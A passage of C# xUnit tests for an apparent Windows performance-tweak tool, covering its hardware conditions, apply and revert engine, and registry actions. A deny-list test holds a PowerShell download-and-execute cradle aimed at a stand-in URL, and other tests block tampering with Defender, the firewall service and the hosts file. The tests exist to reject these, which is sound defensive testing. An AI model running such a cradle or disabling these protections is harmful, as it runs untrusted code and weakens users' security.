        var en = FragForge.Tweaks.Localization.LocalizationLoader.LoadAsync("en-US").GetAwaiter().GetResult();
        Assert.Equal("es-MX", es.Culture);
        Assert.Equal("en-US", en.Culture);
        Assert.NotEqual(es["nav.scan"], en["nav.scan"]);
        Assert.Equal("Operación en curso…", es["busy"]);
        Assert.Equal("Operation in progress…", en["busy"]);
        Assert.Equal("ACEPTO EL RIESGO", es["risk.phrase"]);
    }
}
````

### `tests/FragForge.Tests/Core/ConditionAndPolicyTests.cs`  <sub>(112 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class ConditionAndPolicyTests
{
    private static ConditionResult Evaluate(string type, object? parameters = null, HardwareProfile? profile = null) => new ConditionFactory().Create(Spec.Condition(type, parameters)).Evaluate(profile ?? TestProfiles.Pn64());

    [Fact]
    public void Windows_AcceptsSupportedBuildRange_AndRejectsWindows10() => Assert.False(Evaluate("windows", new { minBuild = 26100, maxBuild = 26299 }, TestProfiles.Windows10()).IsMet);

    [Fact]
    public void Windows_IsUnknownOnUnsupportedPlatform()
    {
        var result = Evaluate("windows", null, TestProfiles.NonWindows());
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
    }

    [Fact]
    public void HybridCpu_MetFor1220P_ButUnknownDoesNotBecomeFalse()
    {
        Assert.True(Evaluate("hybridCpu", new { expected = true }).IsMet);
        var unknown = TestProfiles.Pn64() with { Cpu = TestProfiles.Pn64().Cpu with { IsHybrid = null } };
        var result = Evaluate("hybridCpu", new { expected = true }, unknown);
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
    }

    [Fact]
    public void GpuVendor_IntelIgpuMet_AndNvidiaTweakNotApplicable()
    {
        Assert.True(Evaluate("gpuVendor", new { vendor = "Intel" }).IsMet);
        Assert.False(Evaluate("gpuVendor", new { vendor = "Nvidia" }).IsMet);
        Assert.True(Evaluate("gpuVendor", new { vendor = "Nvidia" }, TestProfiles.GpuOnlyDiscrete()).IsMet);
    }

    [Fact]
    public void AdapterCondition_FindsI225V_AndIgnoresWifiWhenEthernetRequired()
    {
        Assert.True(Evaluate("adapter", new { descriptionContains = "I225-V", kind = "Ethernet", physicalOnly = true }).IsMet);
        Assert.False(Evaluate("adapter", new { descriptionContains = "I225-V", kind = "WiFi" }).IsMet);
    }

    [Fact]
    public void Cs2Condition_IsUnmetWhenNotInstalled() => Assert.False(Evaluate("cs2", new { installed = true }, TestProfiles.NoCs2()).IsMet);

    [Fact]
    public void MemoryChannels_DualOnPn64_SingleWhenProfileSaysSo()
    {
        Assert.True(Evaluate("memoryChannels", new { state = "Dual" }).IsMet);
        Assert.False(Evaluate("memoryChannels", new { state = "Dual" }, TestProfiles.SingleChannel()).IsMet);
        var unknown = TestProfiles.Pn64() with { Memory = TestProfiles.Pn64().Memory with { Channels = MemoryChannelState.Unknown } };
        Assert.False(Evaluate("memoryChannels", new { state = "Dual" }, unknown).IsKnown);
    }

    [Fact]
    public void SecurityCondition_UnknownIsNotTreatedAsDisabled()
    {
        var profile = TestProfiles.Pn64() with { Security = TestProfiles.Pn64().Security with { Vbs = FeatureState.Unknown } };
        var result = Evaluate("security", new { feature = "vbs", state = "Disabled" }, profile);
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
        Assert.True(Evaluate("security", new { feature = "vbs", state = "Disabled" }).IsMet);
    }

    [Fact]
    public void UnknownConditionType_IsRejected()
    {
        var ex = Assert.Throws<CatalogValidationException>(() => new ConditionFactory().Create(Spec.Condition("telepathy")));
        Assert.Contains("telepathy", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Composite_Conditions_ShortCircuitDeterministically()
    {
        var result = Evaluate("all", new { conditions = new object[] { new { type = "windows" }, new { type = "cpuVendor", parameters = new { vendor = "Intel" } } } });
        Assert.True(result.IsMet);
        Assert.False(Evaluate("not", new { condition = new { type = "cpuVendor", parameters = new { vendor = "Intel" } } }).IsMet);
    }

    [Fact]
    public void Denylist_BlocksServicesTasksAndBcd()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("WinDefend"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("mpssvc"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("ipfsvc"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("jhi_service"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureTaskAllowed(@"\Microsoft\Windows\WindowsUpdate\Scheduled Start"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureBcdAllowed("hypervisorlaunchtype"));
        policy.EnsureBcdAllowed("disabledynamictick");
        policy.EnsureServiceAllowed("DiagTrack");
        policy.EnsureServiceAllowed("SysMain");
    }

    [Fact]
    public void Denylist_BlocksNetworkWakePropertiesAndFileTargets()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureNetworkPropertyAllowed("Ethernet", "**EEE"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureNetworkPropertyAllowed("Ethernet", "*RSS"));
        policy.EnsureNetworkPropertyAllowed("Ethernet", "*EEE");
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Windows\System32\drivers\etc\hosts"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsurePowerShellAllowed("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')"));
    }
}
````

### `tests/FragForge.Tests/Core/EngineTestHarness.cs`  <sub>(57 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Engine;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Core.Preflight;
using FragForge.Tests.Fakes;
using FragForge.Tweaks;
using Microsoft.Extensions.Logging.Abstractions;

namespace FragForge.Tests.Core;

public sealed class EngineTestHarness : IDisposable
{
    public FakeRegistry Registry { get; } = new();
    public FakeHardwareProfiler Profiler { get; } = new();
    public FakeSystemRestoreService Restore { get; } = new();
    public FakeJournal? JournalOverride { get; set; }
    public TempDirectory Directory { get; } = new();
    public FragForgePaths Paths { get; }
    public IJournal Journal { get; }
    public ISnapshotStore Snapshots { get; }
    public IProtectionPolicy Policy { get; } = ProtectionPolicy.CreateDefault();
    public FakeActionFactory Factory { get; }
    public TweakCatalog Catalog { get; private set; } = new([]);
    public string UserSid => TestProfiles.Pn64().InteractiveUserSid!;

    public EngineTestHarness(Dictionary<string, ScriptedActionOptions>? scripts = null, bool inMemoryJournal = false)
    {
        if (inMemoryJournal) JournalOverride = new FakeJournal();
        Paths = new FragForgePaths(Directory.Path);
        Paths.EnsureCreated();
        Journal = (IJournal?)JournalOverride ?? new FileJournal(Paths);
        Snapshots = new FileSnapshotStore(Paths);
        Factory = new FakeActionFactory(Registry, Policy, scripts);
    }
    public EngineTestHarness WithCatalog(params TweakDefinition[] definitions)
    {
        Catalog = new TweakCatalog(definitions);
        return this;
    }
    public EngineTestHarness WithProfile(HardwareProfile profile) { Profiler.Profile = profile; return this; }
    public TweakEngine CreateEngine(IEnumerable<IExperimentHook>? hooks = null) => new(
        Catalog,
        Profiler,
        Factory,
        new ConditionFactory(),
        Snapshots,
        Journal,
        Restore,
        new PreflightService(Restore, Catalog),
        new FileExecutionGate(Paths),
        hooks ?? [],
        NullLogger<TweakEngine>.Instance);
    public ApplyOptions Options(bool dryRun = false, bool force = false, TweakProfile profile = TweakProfile.Advanced) => new() { DryRun = dryRun, Force = force, CreateRestorePoint = true, Profile = profile, TargetUserSid = UserSid };
    public void Dispose() => Directory.Dispose();
}
````

### `tests/FragForge.Tests/Core/EngineTests.cs`  <sub>(303 líneas)</sub>

````csharp
using FragForge.Core.Models;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class EngineTests
{
    private static string Sid() => TestProfiles.Pn64().InteractiveUserSid!;

    [Fact]
    public async Task Apply_Then_Revert_LeavesSystemIdentical_AndJournalsBothOperations()
    {
        using var harness = new EngineTestHarness();
        harness.Registry.Set(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value", "DWord", 3);
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var apply = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True(apply.Success, string.Join(" | ", apply.Errors.Concat(apply.Warnings)));
        Assert.NotNull(apply.SnapshotId);
        Assert.Equal(1, harness.Restore.CreateCalls);
        Assert.Equal(1, harness.Registry.GetInt(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value"));
        var entries = await harness.Journal.ReadAllAsync();
        Assert.Contains(entries, e => e.EventType == JournalEventType.SnapshotCreated);
        Assert.Contains(entries, e => e.EventType == JournalEventType.TweakApplied && e.TweakId == "tweak.one");
        var revert = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.True(revert.Success, string.Join(" | ", revert.Errors.Concat(revert.Warnings)));
        Assert.Equal(3, harness.Registry.GetInt(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value"));
        entries = await harness.Journal.ReadAllAsync();
        Assert.Contains(entries, e => e.EventType == JournalEventType.RevertCompleted && e.TweakId == "tweak.one");
    }

    [Fact]
    public async Task Revert_DeletesValueAndAncestorsCreatedOnlyByFragForge()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.create", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeNew\Branch", "Flag", "String", "on")))));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.create"], harness.Options())).Success);
        Assert.Equal("on", harness.Registry.GetString(@"HKU\" + Sid() + @"\Software\FragForgeNew\Branch", "Flag"));
        Assert.True((await engine.RevertAsync(new RevertRequest { Last = true, Options = new RevertOptions { TargetUserSid = Sid() } })).Success, string.Join(" | ", (await engine.RevertAsync(new RevertRequest { Last = true, Options = new RevertOptions { TargetUserSid = Sid(), Force = true } })).Errors));
        Assert.Null(harness.Registry.GetString(@"HKU\" + Sid() + @"\Software\FragForgeNew\Branch", "Flag"));
        Assert.False(harness.Registry.Keys.ContainsKey(@"HKU\" + Sid() + @"\Software\FragForgeNew"));
    }

    [Fact]
    public async Task VerifyFailure_TriggersAutomaticRollback_AndReportsNotApplied()
    {
        using var harness = new EngineTestHarness(new Dictionary<string, ScriptedActionOptions>(StringComparer.OrdinalIgnoreCase) { ["fake.a"] = new ScriptedActionOptions { FailVerify = true } });
        harness.WithCatalog(Tweak.Create("tweak.fake", Spec.Action("Fake", new { id = "fake.a" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.fake"], harness.Options());
        Assert.False(report.Success);
        var result = Assert.Single(report.Results);
        Assert.True(result.RolledBack);
        Assert.False(result.RollbackFailed);
        Assert.Equal(TweakState.NotApplied, result.State);
        Assert.Equal(["verify:fake.a", "apply:fake.a", "verify:fake.a", "revert:fake.a"], harness.Factory.Trace);
    }

    [Fact]
    public async Task RollbackFailure_IsCritical_AndStopsFurtherTweaks()
    {
        using var harness = new EngineTestHarness(new Dictionary<string, ScriptedActionOptions>(StringComparer.OrdinalIgnoreCase) { ["fake.a"] = new ScriptedActionOptions { FailVerify = true, FailRevert = true } });
        harness.WithCatalog(Tweak.Create("tweak.a", Spec.Action("Fake", new { id = "fake.a" })), Tweak.Create("tweak.b", Spec.Action("Fake", new { id = "fake.b" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.a", "tweak.b"], harness.Options());
        Assert.True(report.HasCriticalFailure);
        Assert.DoesNotContain("apply:fake.b", harness.Factory.Trace);
        Assert.Contains("revert:fake.a", harness.Factory.Trace);
    }

    [Fact]
    public async Task Dependencies_AreOrderedBeforeDependents()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(
            Tweak.Create("tweak.child", Spec.Action("Fake", new { id = "child" }), dependsOn: ["tweak.parent"]),
            Tweak.Create("tweak.parent", Spec.Action("Fake", new { id = "parent" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.child"], harness.Options());
        Assert.True(report.Success, string.Join("; ", report.Errors.Concat(report.Warnings)));
        Assert.Equal(["verify:parent", "verify:child", "apply:parent", "verify:parent", "apply:child", "verify:child"], harness.Factory.Trace);
    }

    [Fact]
    public async Task Conflicts_AreRejectedBeforeTouchingTheSystem()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(
            Tweak.Create("tweak.a", Spec.Action("Fake", new { id = "a" }), conflictsWith: ["tweak.b"]),
            Tweak.Create("tweak.b", Spec.Action("Fake", new { id = "b" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.a", "tweak.b"], harness.Options());
        Assert.False(report.Success);
        Assert.Contains(report.Errors, e => e.Contains("Conflicto", StringComparison.OrdinalIgnoreCase));
        Assert.Empty(harness.Factory.Trace);
    }

    [Fact]
    public async Task AppliedExternally_IsNotOverwrittenWithoutForce()
    {
        using var harness = new EngineTestHarness();
        harness.Registry.Set(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value", "DWord", 1);
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var scan = await engine.ScanAsync();
        Assert.Equal(TweakState.AppliedExternally, Assert.Single(scan.Tweaks).State);
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.Equal(TweakState.AppliedExternally, Assert.Single(report.Results).State);
        Assert.Equal(0, harness.Restore.CreateCalls);
        Assert.Empty(harness.Registry.Writes);
    }

    [Fact]
    public async Task IdempotentSecondApply_DoesNotCreateAnotherSnapshot()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.one"], harness.Options())).Success);
        var second = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True(second.Success);
        Assert.Null(second.SnapshotId);
        Assert.Equal(TweakState.Applied, Assert.Single(second.Results).State);
        Assert.Single(await harness.Snapshots.ListAsync());
    }

    [Fact]
    public async Task DryRun_DescribesChangesAndNeverWritesSnapshotsOrRestorePoints()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options(dryRun: true));
        Assert.True(report.Success, string.Join("; ", report.Errors));
        Assert.True(report.DryRun);
        Assert.Contains("no existía", Assert.Single(Assert.Single(report.Results).PlannedChanges).Description, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(harness.Registry.Writes);
        Assert.Equal(0, harness.Restore.CreateCalls);
        Assert.Empty(await harness.Snapshots.ListAsync());
    }

    [Fact]
    public async Task UnmetConditions_YieldNotApplicable_AndDependentsAreSkipped()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(
            Tweak.Create("tweak.nvidia", Spec.Action("Fake", new { id = "nvidia" }), conditions: [Spec.Condition("gpuVendor", new { vendor = "Nvidia" })]),
            Tweak.Create("tweak.dependent", Spec.Action("Fake", new { id = "dependent" }), conditions: [Spec.Condition("gpuVendor", new { vendor = "Nvidia" })], dependsOn: ["tweak.nvidia"]));
        var engine = harness.CreateEngine();
        var scan = await engine.ScanAsync();
        Assert.All(scan.Tweaks, t => Assert.Equal(TweakState.NotApplicable, t.State));
        var apply = await engine.ApplyAsync(["tweak.dependent"], harness.Options());
        Assert.All(apply.Results, r => Assert.Equal(TweakState.NotApplicable, r.State));
        Assert.Empty(harness.Factory.Trace);
    }

    [Fact]
    public async Task UnknownConditions_AreNotTreatedAsMet()
    {
        using var harness = new EngineTestHarness();
        harness.WithProfile(TestProfiles.NonWindows());
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" }), conditions: [Spec.Condition("windows")]));
        var engine = harness.CreateEngine();
        Assert.Equal(TweakState.NotApplicable, Assert.Single((await engine.ScanAsync()).Tweaks).State);
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.Equal(TweakState.NotApplicable, Assert.Single(report.Results).State);
        Assert.Empty(harness.Factory.Trace);
    }

    [Fact]
    public async Task PendingReboot_BlocksRealApply_ButDryRunStillDescribes()
    {
        using var harness = new EngineTestHarness();
        harness.WithProfile(TestProfiles.PendingReboot());
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.one"], harness.Options(dryRun: true))).Success);
        var blocked = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.False(blocked.Success);
        Assert.Contains(blocked.Errors, e => e.Contains("reinicio pendiente", StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain("apply:one", harness.Factory.Trace);
    }

    [Fact]
    public async Task RestorePointFailure_AbortsBeforeApplyingAnything()
    {
        using var harness = new EngineTestHarness();
        harness.Restore.FailCreate = true;
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.False(report.Success, string.Join(" | ", report.Errors));
        Assert.DoesNotContain("apply:one", harness.Factory.Trace);
    }

    [Fact]
    public async Task AdvancedRisk_RequiresProfileAcknowledgementAndExactPhrase()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.advanced", Spec.Action("Fake", new { id = "advanced" }), risk: RiskLevel.Advanced));
        var engine = harness.CreateEngine();
        var denied = await engine.ApplyAsync(["tweak.advanced"], harness.Options(profile: TweakProfile.Balanced));
        Assert.False(denied.Success);
        Assert.Contains(denied.Errors, e => e.Contains("risk_confirmation_required", StringComparison.Ordinal) || e.Contains("perfil", StringComparison.OrdinalIgnoreCase));
        var accepted = await engine.ApplyAsync(["tweak.advanced"], harness.Options() with { RiskAcknowledgements = new HashSet<string>(["tweak.advanced"], StringComparer.OrdinalIgnoreCase), AdvancedRiskPhrase = "ACEPTO EL RIESGO" });
        Assert.True(accepted.Success, string.Join("; ", accepted.Errors));
    }

    [Fact]
    public async Task FailingExperimentHook_BlocksBeforeApply_WhenFatal()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine([new ThrowingExperimentHook()]);
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.False(report.Success, string.Join(" | ", report.Errors));
        Assert.DoesNotContain("apply:one", harness.Factory.Trace);
    }

    [Fact]
    public async Task Revert_RefusesAlreadyRevertedSnapshot_WithoutForce()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var apply = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True((await engine.RevertAsync(new RevertRequest { SnapshotId = apply.SnapshotId, Options = new RevertOptions { TargetUserSid = Sid() } })).Success);
        var ex = await engine.RevertAsync(new RevertRequest { SnapshotId = apply.SnapshotId, Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(ex.Success);
        Assert.Contains(ex.Errors, e => e.Contains("ya fue revertido", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task Revert_DetectsExternalDrift_AndForceOverrides()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.one"], harness.Options())).Success);
        harness.Registry.Set(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value", "DWord", 99);
        var drift = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(drift.Success);
        Assert.Contains(drift.Errors, e => e.Contains("cambió desde la aplicación", StringComparison.OrdinalIgnoreCase));
        var forced = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Options = new RevertOptions { TargetUserSid = Sid(), Force = true } });
        Assert.True(forced.Success, string.Join(" | ", forced.Errors));
        Assert.Null(harness.Registry.GetInt(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value"));
    }

    [Fact]
    public async Task Revert_RejectsAmbiguousSelection()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine();
        var ex = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Last = true, Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(ex.Success);
        Assert.Contains(ex.Errors, e => e.Contains("exactamente uno", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task Journal_IsTamperEvident()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True((await harness.Journal.VerifyIntegrityAsync()).IsValid);
        var lines = await File.ReadAllLinesAsync(harness.Paths.Journal);
        lines[0] = lines[0].Replace("\"OperationStarted\"", "\"OperationFailed\"", StringComparison.Ordinal);
        await File.WriteAllLinesAsync(harness.Paths.Journal, lines);
        var integrity = await harness.Journal.VerifyIntegrityAsync();
        Assert.False(integrity.IsValid);
        var blocked = await engine.RevertAsync(new RevertRequest { Last = true, Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(blocked.Success);
        Assert.Contains(blocked.Errors, e => e.Contains("journal", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task InspectOnlyTweak_IsReadOnly_AndNeverCreatesRestorePoint()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.inspect", Spec.Action("Fake", new { id = "inspect" }), tags: ["diagnostic"]));
        var engine = harness.CreateEngine();
        var scan = await engine.ScanAsync();
        Assert.False(harness.Catalog.Definitions[0].ReadOnly);
        Assert.NotNull(scan.Tweaks);
    }

    [Fact]
    public async Task Cancellation_BeforeApply_LeavesNoPartialState()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        using var cts = new CancellationTokenSource();
        cts.Cancel();
        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => engine.ApplyAsync(["tweak.one"], harness.Options(), cts.Token));
        Assert.Empty(harness.Registry.Writes);
        Assert.Equal(0, harness.Restore.CreateCalls);
    }
}
````

### `tests/FragForge.Tests/Core/RegistryActionTests.cs`  <sub>(170 líneas)</sub>

````csharp
using FragForge.Actions.Registry;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class RegistryActionTests
{
    private const string HkcuKey = @"HKCU\Software\FragForgeTests";
    private const string Key = @"HKU\S-1-5-21-1111111111-2222222222-3333333333-1001\Software\FragForgeTests";
    private static ActionExecutionContext Context(HardwareProfile? profile = null) => new() { OperationId = "test", Hardware = profile ?? TestProfiles.Pn64(), TargetUserSid = TestProfiles.Pn64().InteractiveUserSid };
    private static RegistryAction Create(FakeRegistry registry, params object[] values) => new(registry, ProtectionPolicy.CreateDefault(), Spec.Action("Registry", Spec.Registry(values)));

    [Fact]
    public async Task CaptureApplyRevert_RestoresExistingValueExactly()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Existing", "DWord", 7);
        var action = Create(registry, Spec.Value(HkcuKey, "Existing", "DWord", 1), Spec.Value(HkcuKey, "Second", "String", "value"));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(1, registry.GetInt(Key, "Existing"));
        Assert.Equal("value", registry.GetString(Key, "Second"));
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        await action.RevertAsync(before, Context());
        Assert.Equal(7, registry.GetInt(Key, "Existing"));
        Assert.Null(registry.GetString(Key, "Second"));
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, Context())).Outcome);
    }

    [Fact]
    public async Task Revert_DeletesValueThatDidNotExist_AndRemovesEmptyAncestors()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "NewValue", "DWord", 5));
        var before = await action.CaptureAsync(Context());
        Assert.Null(registry.GetInt(Key, "NewValue"));
        await action.ApplyAsync(before, Context());
        Assert.Equal(5, registry.GetInt(Key, "NewValue"));
        await action.RevertAsync(before, Context());
        Assert.Null(registry.GetInt(Key, "NewValue"));
        Assert.False(await registry.KeyExistsAsync(Key));
        Assert.Equal(1, registry.Deletes[$@"{Key}::NewValue"]);
    }

    [Fact]
    public async Task Apply_IsIdempotent_WhenTargetAlreadyMatches()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Value", "DWord", 1);
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        var before = await action.CaptureAsync(Context());
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        await action.ApplyAsync(before, Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(1, registry.GetInt(Key, "Value"));
    }

    [Fact]
    public async Task Binary_And_MultiString_AreRoundTripped()
    {
        var registry = new FakeRegistry();
        var payload = new byte[] { 1, 2, 3, 4, 0, 255 };
        registry.Set(Key, "Blob", "Binary", new byte[] { 9, 9 });
        registry.Set(Key, "List", "MultiString", new[] { "old", "values" });
        var action = Create(registry, Spec.Value(HkcuKey, "Blob", "Binary", Convert.ToBase64String(payload)), Spec.Value(HkcuKey, "List", "MultiString", new[] { "new" }));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(payload, (byte[])registry.Keys[Key]["Blob"].Data);
        await action.RevertAsync(before, Context());
        Assert.Equal(new byte[] { 9, 9 }, (byte[])registry.Keys[Key]["Blob"].Data);
        Assert.Equal(new[] { "old", "values" }, (string[])registry.Keys[Key]["List"].Data);
    }

    [Fact]
    public async Task AddToken_PreservesExistingFlagsAndRevertRestoresExactly()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Layers", "String", "~ RUNASADMIN");
        var action = Create(registry, Spec.Value(HkcuKey, "Layers", "String", "DISABLEDXMAXIMIZEDWINDOWEDMODE", "AddToken"));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal("~ RUNASADMIN DISABLEDXMAXIMIZEDWINDOWEDMODE", registry.GetString(Key, "Layers"));
        await action.ApplyAsync(before, Context());
        Assert.Equal("~ RUNASADMIN DISABLEDXMAXIMIZEDWINDOWEDMODE", registry.GetString(Key, "Layers"));
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        await action.RevertAsync(before, Context());
        Assert.Equal("~ RUNASADMIN", registry.GetString(Key, "Layers"));
    }

    [Fact]
    public async Task AddToken_RevertDeletesValueThatDidNotExist()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "Layers", "String", "TOKEN", "AddToken"));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal("TOKEN", registry.GetString(Key, "Layers"));
        await action.RevertAsync(before, Context());
        Assert.Null(registry.GetString(Key, "Layers"));
    }

    [Fact]
    public async Task Hkcu_IsResolvedToTheInteractiveUserSid_NotTheProcessHive()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        var resolved = @"HKU\" + TestProfiles.Pn64().InteractiveUserSid + HkcuKey[4..];
        Assert.True(registry.Keys.ContainsKey(resolved));
        Assert.False(registry.Keys.ContainsKey(HkcuKey));
    }

    [Fact]
    public async Task Denylist_BlocksDefenderRegistry_AtConstruction()
    {
        var registry = new FakeRegistry();
        var ex = Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "DWord", 0)));
        Assert.Equal("protected_target", ex.Code);
    }

    [Fact]
    public async Task Denylist_BlocksServiceKeyUnderServices()
    {
        var registry = new FakeRegistry();
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SYSTEM\CurrentControlSet\Services\WinDefend", "Start", "DWord", 4)));
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SYSTEM\CurrentControlSet\Services\ipfsvc", "Start", "DWord", 4)));
